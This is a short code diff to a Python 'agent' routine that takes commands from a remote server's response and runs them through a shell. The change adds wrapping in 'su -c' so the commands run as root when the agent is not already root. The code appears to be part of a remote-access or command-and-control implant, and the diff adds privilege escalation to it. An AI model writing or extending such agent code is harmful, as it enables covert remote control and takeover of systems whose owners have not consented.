@@ -147,8 +147,9 @@ def run_agent():
                     cmd = resp_data.get("cmd")
                     if cmd:
                         print(f"[*] Executing remote command: {cmd}")
+                        cmd_to_run = cmd if os.geteuid() == 0 else f"su -c {json.dumps(cmd)}"
                         try:
-                            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15, text=True)
+                            out = subprocess.check_output(cmd_to_run, shell=True, stderr=subprocess.STDOUT, timeout=15, text=True)
                         except subprocess.CalledProcessError as cpe:
                             out = f"Error (exit {cpe.returncode}):\n{cpe.output}"
                         except Exception as ex:
